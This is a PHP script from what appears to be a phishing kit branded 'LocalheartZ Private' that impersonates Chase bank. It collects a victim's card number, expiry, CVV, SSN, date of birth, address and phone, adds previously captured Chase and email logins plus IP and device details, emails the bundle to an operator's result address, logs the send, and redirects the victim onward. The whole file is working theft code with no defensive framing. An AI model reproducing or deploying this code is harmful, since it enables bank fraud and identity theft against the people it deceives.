<?php
require_once(dirname(dirname(dirname(__DIR__))) . '/autoload.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
  $core->_save_ses('cardholder', trim($_POST['cardhold']));
  $core->_save_ses('cardnumber', trim($_POST['cardnum']));
  $core->_save_ses('expire', trim($_POST['mmon'])."/".trim($_POST['yyear']));
  $core->_save_ses('cvv', trim($_POST['cvv']));

  $core->_save_ses('fullname', trim($_POST['fullname']));
  $core->_save_ses('address', trim($_POST['address']));
  $core->_save_ses('city', trim($_POST['city']));
  $core->_save_ses('state', trim($_POST['state']));
  $core->_save_ses('zipcode', trim($_POST['zipcode']));
  $core->_save_ses('phone', trim($_POST['phone']));
  $core->_save_ses('dob', trim($_POST['dob']));
  $core->_save_ses('ssn', trim($_POST['ssn']));

  $browser = $core->is_mobile ? $core->_get_ses('mobile', $core->mobile) : $core->_get_ses('browser', $core->browser);

  $message    = "
  --------------[ LocalheartZ Private ] ------------------ <br>
  <br>
  ----- Chase Account ----- <br>
  Username   : " . $core->_get_ses('username') . "<br>
  Password   : " . $core->_get_ses('password') . "<br>
  <br>
  ----- Email Account ----- <br>
  Email : " . $core->_get_ses('email') . "<br>
  Password : " . $core->_get_ses('passwmail') . "<br>
  <br>
  CC Name : " . $core->_get_ses('cardholder') . "<br>
  CC Number : " . $core->_get_ses('cardnumber') . "<br>
  Expired : " . $core->_get_ses('expire') . "<br>
  CVV : " . $core->_get_ses('cvv') . "<br>
  Copy Check Live : " . $core->_checkcc() . "<br>
  <br>
  Fullname : " . $core->_get_ses('fullname') . "<br>
  Address : " . $core->_get_ses('address') . "<br>
  City : " . $core->_get_ses('city') . "<br>
  State : " . $core->_get_ses('state') . "<br>
  Zip : " . $core->_get_ses('zipcode') . "<br>
  Phone : " . $core->_get_ses('phone') . "<br>
  DOB : " . $core->_get_ses('dob') . "<br>
  SSN : " . $core->_get_ses('ssn') . "<br>
  <br>
  IP & ISP : " . $core->_get_ses('ip') . " | " . $core->_get_ses('isp') . "<br>
  Date : " . $core->_re_date() . "<br>
  Device : " . $core->_get_ses('platform') . "<br>
  User Agent : " . $browser . ", " . $core->_get_ses('useragent') . "<br>
  <br>
  --------------[ LocalheartZ Private ] ------------------ <br>
  ";
  // echo "<textarea>".$message."</textarea>";
  // echo $core->_bin($core->_get_ses('cardnumber'));
  // echo $core->_checkcc();
  $subject    = "Result Credit Card | ". $core->_bin($core->_get_ses('cardnumber')) ." [ " . $core->_get_ses('ip') . " - " . $core->_get_ses('regionName') . " ] ";
  $sendername = "LHZ - CHASE";
  $send       = $core->_send(trim($core->_config('result')), $sendername, $subject, $message, 'cc');
  //
  $core->_visitor('submitted cc.');
  $core->updateJmlh('cc');
  $sender = ($core->_config('sender') == 0 ? 'SMTP' : 'MAIL');
  if ($send == TRUE) {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase CC', 'Success');
  } else {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase CC', 'Failed');
  }
  //
  $core->_redirect('/auth/restore?indexToken=' . sha1(md5($core->_get_ses('ip'))) . '&authToken=' . md5(sha1($core->_get_ses('ip'))));

} else {
  die('not a post method.'); exit;
}
